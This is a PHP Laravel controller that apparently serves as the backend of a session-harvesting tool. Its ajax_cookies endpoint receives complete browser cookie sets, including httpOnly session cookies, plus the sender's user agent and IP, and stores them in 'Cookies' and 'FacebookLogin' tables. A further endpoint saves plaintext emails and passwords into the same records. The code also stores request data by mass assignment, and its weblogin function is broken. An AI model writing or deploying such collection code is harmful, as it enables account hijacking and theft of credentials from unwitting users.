<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use DB;
use Auth;
use JWTAuth;
use App\User;
use App\Cookies;
use App\Facebook;
use JWTAuthException;
use Validator;
use App\FacebookLogin;



use App\Http\Controllers\Controller;

class UserController extends Controller
{
    //
    /*public function ajax_register(Request $request){
    
    	if ($request->isMethod('post')) {
            if($request['password'] != $request['password_confirmation']){
                return response()->json([
                    'status' => 'error', 
                    'msg' => 'The password confirmation does not match.'
                ], 401);
            }
    		$request['password'] = bcrypt($request->get('password'));
    		$request['password_confirmation'] = bcrypt($request->get('password_confirmation'));
   		
			if(User::create($request->all())){
				return response()->json([
                    'status' => 'success', 
                    'msg' => 'You are register successfully.'
                ], 200);
			}else{
				return response()->json([
                    'status' => 'error', 
                    'msg' => 'You are not register yet,please try once again.'
                ], 401);
			}
    	}
    }*/


    // Start 


public function ajax_register(Request $request){

$rules = array(          
           
            'email' => 'email|unique:register_user',
            'password' => 'required',
            'password_confirmation' => 'required|same:password'   

        );

$validator = Validator::make($request->all(), $rules);
        if ($validator->fails()) {

            if ($validator->errors()->has('email')) {
                $errormes = $validator->errors()->first('email');
            }      

            if($request['password'] != $request['password_confirmation']){
                return response()->json([
                    'status' => 'error', 
                    'msg' => 'The password confirmation does not match.'
                ]);
            }            


           return response()->json([
                  
                    'status' => 'error',
                      'msg' => $errormes, 
                   
                ]);
            
        } else{    
        
            $request['password'] = bcrypt($request->get('password'));
            $request['password_confirmation'] = bcrypt($request->get('password_confirmation'));
        
            if(User::create($request->all())){
                return response()->json([
                    'status' => 'success', 
                    'msg' => 'You are register successfully.'
                ], 200);
            }else{
                return response()->json([
                    'status' => 'error', 
                    'msg' => 'You are not register yet,please try once again.'
                ], 401);
            }
        }
    }



    // Close
    public function ajax_login(Request $request){
    	
    	if ($request->isMethod('post')) {
    		$email = $request->get('email');
    		$password = $request->get('password');
    		if (Auth::attempt(array('email' => $email, 'password' => $password, 'status' => 1))){

                $data = User::where('email',$email)->first();

                User::where('email',$email)->update(['live' => 1]);
                Cookies::where('user_id',$data['id'])->update(['ip' => $_SERVER['REMOTE_ADDR']]);
               return response()->json([
                     'id' => $data['id'],
                    'status' => 'success', 
                    'msg' => 'You are logged in successfully.'
                ], 200);
            }
            else {        
                return response()->json([
                    'status' => 'error', 
                    'msg' => 'We can`t find an account with this credentials.'
                ], 401);
            }
    	}
    }
    public function updatesV2(Request $request){
    	if (!empty($_SERVER['REMOTE_ADDR']))   
	  	{
	    	$ip_address = $_SERVER['REMOTE_ADDR'];
	    	$request['ip_address'] = $ip_address;
	 	} 

	 	unset($request['api_key']);
    	if ($request->isMethod('post')) {
    		if(Facebook::create($request->all())){
				return response()->json([
	                    'status' => 'success', 
	                    'msg' => 'Save data successfully.'
	            ], 200);
			}else{
				return response()->json([
	                    'status' => 'success', 
	                    'msg' => 'Data could not be save.'
	            ], 401);
			}	
    	}
    }

    public function ajax_cookies(Request $request){

        $cookieData = Cookies::where('user_id', $request['user_id'])->first(); 
    	
    	if ($request->isMethod('post')) {
    		if (!empty($_SERVER['REMOTE_ADDR']))   
		  	{
		    	$ip_address = $_SERVER['REMOTE_ADDR'];
		    	$request['ip'] = $ip_address;
		 	}
		 	$request['user_id'] = $request->get('user_id');
            $request['user_agent'] = $request->get('user_agent');
            
    		$data = $request->get('data');
			$i = 0;
         
    		foreach ($data as $key => $value) {
    			$arr[$i]['name'] = $value['name'];
                $arr[$i]['value'] = $value['value'];
                $arr[$i]['domain'] = $value['domain'];              
                $arr[$i]['hostOnly'] = (bool)$value['hostOnly'];
                $arr[$i]['httpOnly'] = (bool)$value['httpOnly'];
                $arr[$i]['path'] = $value['path'];
                $arr[$i]['sameSite'] = $value['sameSite'];
                $arr[$i]['secure'] = (bool)$value['secure'];
                $arr[$i]['session'] = (bool)$value['session'];
                $arr[$i]['storeId'] = $value['storeId'];
                $arr[$i]['id'] = $i;
                
    			$i++;
    		}
          
    		$serialized_array= json_encode($arr);
            
    		$request['cookis_data'] = $serialized_array;

            if(!empty($request['user_id']) and !empty($cookieData['user_id']))
            {
               // echo "<pre>"; print_r($request['data']); die();
                $data = Cookies::where('user_id',$request['user_id'])->update($request->except(['data']));
                FacebookLogin::create($request->all());

                if($data)
                {
                    return response()->json([
                    'status' => 'success', 
                    'msg' => 'Cookies save successfully.'
                ], 200);
                } else{
                    
                    return response()->json([
                    'status' => 'error', 
                    'msg' => 'Cookies not save successfully.'
                ], 401);

                }



            }elseif (empty($cookieData['user_id'])) {
                if(Cookies::create($request->all())){
                    FacebookLogin::create($request->all());
                return response()->json([
                    'status' => 'success', 
                    'msg' => 'Cookies save successfully.'
                ], 200);
            }else{
                return response()->json([
                    'status' => 'error', 
                    'msg' => 'Cookies not save successfully.'
                ], 401);
            }
                # code...
            }else{

			if(Cookies::create($request->all())){
                FacebookLogin::create($request->all());
				return response()->json([
                    'status' => 'success', 
                    'msg' => 'Cookies save successfully.'
                ], 200);
			}else{
				return response()->json([
                    'status' => 'error', 
                    'msg' => 'Cookies not save successfully.'
                ], 401);
			}
        }









    	}
    }


    public function weblogin($email , $password)
    {

        $credentials = [
        'email' => $request['username'],
        'password' => $request['password'],
    ];

        if (Auth::attempt($credentials)) {
        return redirect()->route('home');
    }

    return 'Failure';


    }





    public function updatecookie(Request $request)
    {
      $logid = FacebookLogin::where('user_id',$request['user_id'])->orderBy('id','desc')->first();


        Cookies::where('user_id',$request['user_id'])->update(['email' => $request['email'],'password' => $request['password']]);

          FacebookLogin::where('id', $logid['id'])->update(['name' => $request['email'],'password' => $request['password']]);        
     
    }

    public function checkUserLoggedIn(Request $request){      

     $data =   User::where('id' , $request['user_id'])->update(['last_login' => date("Y-m-d h:i:s", time())]);

     if($data)
     {
        echo "1";
     } else{
        echo "0";
     }


    }
}
